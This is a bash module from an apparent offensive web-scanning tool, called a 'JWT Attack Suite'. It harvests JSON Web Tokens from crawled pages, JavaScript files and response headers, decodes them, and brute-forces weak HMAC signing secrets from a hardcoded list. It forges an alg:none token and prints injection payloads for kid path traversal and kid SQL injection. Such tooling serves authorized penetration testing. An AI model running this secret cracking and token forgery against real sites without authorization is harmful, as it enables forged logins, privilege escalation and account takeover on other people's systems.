#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === JWT ATTACK SUITE ===
# 15. JWT ATTACK v2 (Full Analysis + Attack Suite)
run_jwt_suite() {
    if check_dependency "$OUT_DIR/vulns/jwt_findings.txt" "JWT Attack"; then return; fi
    log_phase "JWT SECURITY ANALYSIS v2 (DECODE + ATTACK)"
    
    mkdir -p "$OUT_DIR/.temp" "$OUT_DIR/vulns"
    : > "$OUT_DIR/.temp/jwts.txt"
    
    # ── STEP 1: MULTI-SOURCE JWT EXTRACTION ──
    log_step "Extracting JWTs from all sources..."
    
    # A) From URLs and response bodies
    if [ -s "$OUT_DIR/endpoints/alive_urls.txt" ]; then
        grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' \
            "$OUT_DIR/endpoints/alive_urls.txt" >> "$OUT_DIR/.temp/jwts.txt" 2>/dev/null || true
    fi
    
    # B) From JS files
    if [ -s "$OUT_DIR/endpoints/js_targets.txt" ]; then
        head -n 30 "$OUT_DIR/endpoints/js_targets.txt" | \
            parallel -j 10 --timeout 15 "curl -sL {} 2>/dev/null" | \
            grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' \
            >> "$OUT_DIR/.temp/jwts.txt" 2>/dev/null || true
    fi
    
    # C) From response headers (Set-Cookie, Authorization)
    if [ -s "$OUT_DIR/endpoints/clean_urls.txt" ]; then
        head -n 50 "$OUT_DIR/endpoints/clean_urls.txt" | \
            parallel -j 10 --timeout 10 "curl -sI {} 2>/dev/null" | \
            grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' \
            >> "$OUT_DIR/.temp/jwts.txt" 2>/dev/null || true
    fi
    
    # D) From secrets findings
    if [ -s "$OUT_DIR/secrets/smart_secrets.txt" ]; then
        grep -oP 'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*' \
            "$OUT_DIR/secrets/smart_secrets.txt" >> "$OUT_DIR/.temp/jwts.txt" 2>/dev/null || true
    fi
    
    sort -u "$OUT_DIR/.temp/jwts.txt" -o "$OUT_DIR/.temp/jwts.txt"
    local jwt_count=$(wc -l < "$OUT_DIR/.temp/jwts.txt" 2>/dev/null || echo 0)
    log_stat "Unique JWTs extracted" "$jwt_count"
    
    if [ "$jwt_count" -eq 0 ]; then
        log_warn "No JWT tokens found. Skipping JWT analysis."
        echo "# No JWT tokens found" > "$OUT_DIR/vulns/jwt_findings.txt"
        return
    fi
    
    # ── STEP 2: DECODE + ANALYZE EACH JWT ──
    log_step "Decoding and analyzing JWT tokens..."
    : > "$OUT_DIR/vulns/jwt_findings.txt"
    
    local finding_count=0
    while IFS= read -r jwt; do
        [ -z "$jwt" ] && continue
        
        # Split JWT into parts
        local header_b64=$(echo "$jwt" | cut -d. -f1)
        local payload_b64=$(echo "$jwt" | cut -d. -f2)
        
        # Fix base64 padding (0-2 padding chars needed)
        local hpad=$(( (4 - ${#header_b64} % 4) % 4 ))
        local ppad=$(( (4 - ${#payload_b64} % 4) % 4 ))
        local header_padded="${header_b64}$(printf '%0.s=' $(seq 1 $hpad) 2>/dev/null)"
        local payload_padded="${payload_b64}$(printf '%0.s=' $(seq 1 $ppad) 2>/dev/null)"
        
        # Decode (tr for URL-safe base64)
        local header_json=$(echo "$header_padded" | tr '_-' '/+' | base64 -d 2>/dev/null || echo '{}')
        local payload_json=$(echo "$payload_padded" | tr '_-' '/+' | base64 -d 2>/dev/null || echo '{}')
        
        # Extract algorithm
        local alg=$(echo "$header_json" | grep -oP '"alg"\s*:\s*"[^"]*"' | head -1 | grep -oP '"[^"]*"$' | tr -d '"')
        
        echo "================================================================" >> "$OUT_DIR/vulns/jwt_findings.txt"
        echo "[JWT] ${jwt:0:50}..." >> "$OUT_DIR/vulns/jwt_findings.txt"
        echo "  Algorithm: ${alg:-unknown}" >> "$OUT_DIR/vulns/jwt_findings.txt"
        echo "  Header:  $header_json" >> "$OUT_DIR/vulns/jwt_findings.txt"
        echo "  Payload: $payload_json" >> "$OUT_DIR/vulns/jwt_findings.txt"
        
        # ── CHECK 1: Algorithm vulnerabilities ──
        if echo "$alg" | grep -qi "none"; then
            echo "  [CRITICAL] Algorithm is 'none' — signature not verified!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        if echo "$alg" | grep -qi "^HS"; then
            echo "  [HIGH] HMAC algorithm ($alg) — susceptible to key confusion if RSA public key is known" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        # ── CHECK 2: Missing expiry ──
        if ! echo "$payload_json" | grep -q '"exp"'; then
            echo "  [HIGH] No 'exp' claim — token never expires!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        else
            # Check if expired (compare with current epoch)
            local exp_val=$(echo "$payload_json" | grep -oP '"exp"\s*:\s*\K[0-9]+' | head -1)
            local now=$(date +%s)
            if [ -n "$exp_val" ] && [ "$exp_val" -lt "$now" ] 2>/dev/null; then
                echo "  [MEDIUM] Token EXPIRED (exp: $exp_val, now: $now)" >> "$OUT_DIR/vulns/jwt_findings.txt"
            elif [ -n "$exp_val" ]; then
                local ttl=$(( (exp_val - now) / 3600 ))
                if [ "$ttl" -gt 720 ]; then
                    echo "  [MEDIUM] Very long expiry: ${ttl}h (>30 days)" >> "$OUT_DIR/vulns/jwt_findings.txt"
                    finding_count=$((finding_count + 1))
                fi
            fi
        fi
        
        # ── CHECK 3: PII in claims ──
        if echo "$payload_json" | grep -qiE '"(email|phone|ssn|address|credit_card|password|secret)"'; then
            echo "  [HIGH] Sensitive PII found in token claims!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        # ── CHECK 4: Admin/privilege claims ──
        if echo "$payload_json" | grep -qiE '"(admin|role|is_admin|privilege|superuser)"\s*:\s*(true|"admin"|"root"|1)'; then
            echo "  [CRITICAL] Admin/privilege claim found in token!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        # ── CHECK 5: Weak secret brute-force (HMAC only) ──
        if echo "$alg" | grep -qi "^HS"; then
            local header_payload="${header_b64}.${payload_b64}"
            local sig_b64=$(echo "$jwt" | cut -d. -f3)
            
            local weak_secrets=("secret" "password" "key" "123456" "" "test" "admin" "jwt_secret" "changeme" "your-256-bit-secret")
            
            for secret in "${weak_secrets[@]}"; do
                local computed_sig
                if echo "$alg" | grep -qi "256"; then
                    computed_sig=$(echo -n "$header_payload" | openssl dgst -sha256 -hmac "$secret" -binary 2>/dev/null | base64 | tr '+/' '-_' | tr -d '=' 2>/dev/null || echo "")
                elif echo "$alg" | grep -qi "384"; then
                    computed_sig=$(echo -n "$header_payload" | openssl dgst -sha384 -hmac "$secret" -binary 2>/dev/null | base64 | tr '+/' '-_' | tr -d '=' 2>/dev/null || echo "")
                elif echo "$alg" | grep -qi "512"; then
                    computed_sig=$(echo -n "$header_payload" | openssl dgst -sha512 -hmac "$secret" -binary 2>/dev/null | base64 | tr '+/' '-_' | tr -d '=' 2>/dev/null || echo "")
                fi
                
                if [ -n "$computed_sig" ] && [ "$computed_sig" = "$sig_b64" ]; then
                    echo "  [CRITICAL] WEAK SECRET FOUND: '$secret' — full token forgery possible!" >> "$OUT_DIR/vulns/jwt_findings.txt"
                    finding_count=$((finding_count + 1))
                    break
                fi
            done
        fi
        
        # ── CHECK 6: alg:none attack ──
        local none_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
        local forged_token="${none_header}.${payload_b64}."
        echo "  [INFO] alg:none forged token: ${forged_token:0:60}..." >> "$OUT_DIR/vulns/jwt_findings.txt"
        
        # ── CHECK 7: kid / jku / x5u header injection ──
        if echo "$header_json" | grep -qiE '"kid"'; then
            local kid_val=$(echo "$header_json" | grep -oP '"kid"\s*:\s*"\K[^"]+' 2>/dev/null || echo "")
            echo "  [INFO] kid parameter present: $kid_val" >> "$OUT_DIR/vulns/jwt_findings.txt"
            
            # kid path traversal → use /dev/null (always empty = empty key)
            echo "  [HIGH] kid path traversal attack possible: set kid=\"../../dev/null\" + sign with empty key" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
            
            # kid SQL injection indicator
            if echo "$kid_val" | grep -qE '^[0-9]+$'; then
                echo "  [MEDIUM] kid is numeric — potential SQL injection: kid=\"1' UNION SELECT 'attackerkey'--\"" >> "$OUT_DIR/vulns/jwt_findings.txt"
                finding_count=$((finding_count + 1))
            fi
        fi
        
        if echo "$header_json" | grep -qiE '"jku"'; then
            local jku_val=$(echo "$header_json" | grep -oP '"jku"\s*:\s*"\K[^"]+' 2>/dev/null || echo "")
            echo "  [CRITICAL] jku header present: $jku_val — attacker can supply own JWKS endpoint!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        if echo "$header_json" | grep -qiE '"x5u"'; then
            local x5u_val=$(echo "$header_json" | grep -oP '"x5u"\s*:\s*"\K[^"]+' 2>/dev/null || echo "")
            echo "  [CRITICAL] x5u header present: $x5u_val — attacker can supply own X.509 cert chain!" >> "$OUT_DIR/vulns/jwt_findings.txt"
            finding_count=$((finding_count + 1))
        fi
        
        echo "" >> "$OUT_DIR/vulns/jwt_findings.txt"
    done < "$OUT_DIR/.temp/jwts.txt"
    
    log_stat "JWT Security Findings" "$finding_count"
    log_success "JWT Attack Suite v2 completed."
}

